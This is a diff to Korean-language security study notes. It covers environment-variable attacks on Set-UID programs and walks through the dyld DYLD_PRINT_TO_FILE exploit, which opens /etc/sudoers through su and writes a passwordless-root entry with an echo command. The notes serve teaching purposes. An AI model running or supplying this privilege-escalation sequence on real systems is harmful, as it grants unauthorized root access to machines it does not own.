@@ -162,7 +162,7 @@ LD_MYOWN = my own value
 	1. DYLD_PRINT_TO_FILE를 /etc/sudoers로 설정
 	2. Bob의 계정으로 전환하기 위해 su를 실행
 	3. su를 실행하는 동안 dyld가 실행됨
-	4. su가 Set-UID root 프로그램이므로 dyld도 root 권한으로 실행되어 /etc/sudoers를 성공적으로 쓰기 모드로 엽니다
+	4. **su가 Set-UID root 프로그램이므로 dyld도 root 권한으로 실행**되어 /etc/sudoers를 성공적으로 쓰기 모드로 엽니다
 	5. echo 명령어를 사용하여 /etc/sudoers에 쓰기
 	6. 여기서 "3"은 /etc/sudoers의 쓰기용 파일 디스크립터를 나타냅니다
 	7. 결과적으로 bob은 sudo를 사용하여 root로서 어떤 명령어든 실행할 수 있습니다.
@@ -171,6 +171,7 @@ $ DYLD_PRINT_TO_FILE = /etc/sudoers
 $ su bob
 password:
 $ echo "bob ALL = (ALL) NOPASSWD:ALL" >& 3
+-> bob은 모든 프로그램에 대해 root 권한을 가져 패스워드가 필요없다는 명령어
 ```
 - 외부 프로그램을 통한 공격
 	- 어플리케이션이 외부 프로그램을 호출 시, 환경 변수 사용 가능성 존재
